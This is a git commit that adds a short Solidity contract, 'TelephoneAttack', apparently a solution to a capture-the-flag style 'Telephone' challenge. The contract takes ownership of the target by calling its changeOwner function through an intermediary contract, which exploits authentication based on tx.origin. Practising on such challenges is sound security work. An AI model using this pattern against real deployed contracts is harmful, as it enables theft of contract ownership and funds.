8a587e47176056a2052c02b0268e5f06314d3371
lquint <83752971+lquint@users.noreply.github.com>
2023-02-17 21:36:30 +0100

    redacted telephone attacker contract

---
+++ remixContracts/TelephoneAttack.sol
@@ -0,0 +1,15 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./Telephone.sol";
+
+contract TelephoneAttack{
+    Telephone public telephone;
+    constructor(address _telephone){
+       telephone=Telephone(_telephone);
+    }
+
+    function call() public {
+        telephone.changeOwner(msg.sender);
+    }
+}
